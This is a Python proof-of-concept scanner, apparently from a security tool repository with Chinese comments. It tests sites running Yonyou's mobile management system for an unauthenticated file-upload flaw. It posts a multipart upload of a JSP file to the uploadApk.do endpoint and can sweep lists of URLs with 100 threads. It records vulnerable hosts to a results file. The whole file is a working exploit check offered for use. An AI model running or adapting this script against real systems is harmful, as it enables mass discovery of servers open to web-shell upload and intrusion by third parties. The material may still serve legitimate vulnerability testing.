import requests
import argparse
import sys
from multiprocessing.dummy import Pool
from concurrent.futures import ThreadPoolExecutor
import logging
# requests.packages.urllib3.disable_warnings()

def banner():
    test = """                                                    
 ___.__. ____   ____    ____ ___.__. ____  __ __ 
<   |  |/  _ \ /    \  / ___<   |  |/  _ \|  |  \
 \___  (  <_> )   |  \/ /_/  >___  (  <_> )  |  /
 / ____|\____/|___|  /\___  // ____|\____/|____/ 
 \/                \//_____/ \/                  
                                        version:1.0.0
                                        author:gtman                                        
"""
    print(test)

def main():
    banner() # banner
    # 处理命令行参数
    parser = argparse.ArgumentParser(description="检测用友移动管理系统存在文件上传漏洞")
    # 添加两个参数
    parser.add_argument('-u', '--url', dest='url', type=str, help='输入链接')
    parser.add_argument('-f', '--file', dest='file', type=str, help='文件路径')
    # 解析参数
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        try:
            with open(args.file, 'r', encoding='utf-8') as fp:
                url_list = [i.strip() for i in fp.readlines()]
            with ThreadPoolExecutor(max_workers=100) as executor:
                executor.map(poc, url_list)
        except FileNotFoundError:
            print(f"文件 {args.file} 未找到")
        except Exception as e:
            print(f"文件处理时出错: {e}")
    else:
        print(f"用法:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/maportal/appmanager/uploadApk.do?pk_obj='
    url = target + url_payload
    headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close",
        "Cookie": "JSESSIONID=AAC37658EE256C5B82F85CCB3F27EE0E.server; JSESSIONID=68D8CD7BD870BF0CCC6FBAA9614D80F0.server",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3"
    }

    # 构造要上传的文件数据
    data = (
        "------WebKitFormBoundaryvLTG6zlX0gZ8LzO3\r\n"
        "Content-Disposition: form-data; name=\"downloadpath\"; filename=\"a.jsp\"\r\n"
        "Content-Type: application/msword\r\n\r\n"
        "hello\r\n"
        "------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--"
    )

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        response = requests.post(url=url, headers=headers, data=data, proxies=proxies)
        
        if response.status_code == 200 and '"status":2' in response.text:
            print(f"[*] 该站点 {target} 存在文件上传漏洞")
            with open("result.txt", "a", encoding="utf-8") as fp:
                fp.write(f"{target}\n")
        else:
            print(f"[-] 该站点 {target} 不存在文件上传漏洞")

    except requests.exceptions.RequestException as e:
        print(f"[+] 该站点 {target} 存在访问问题，请手动测试")

if __name__ == '__main__':
    main()
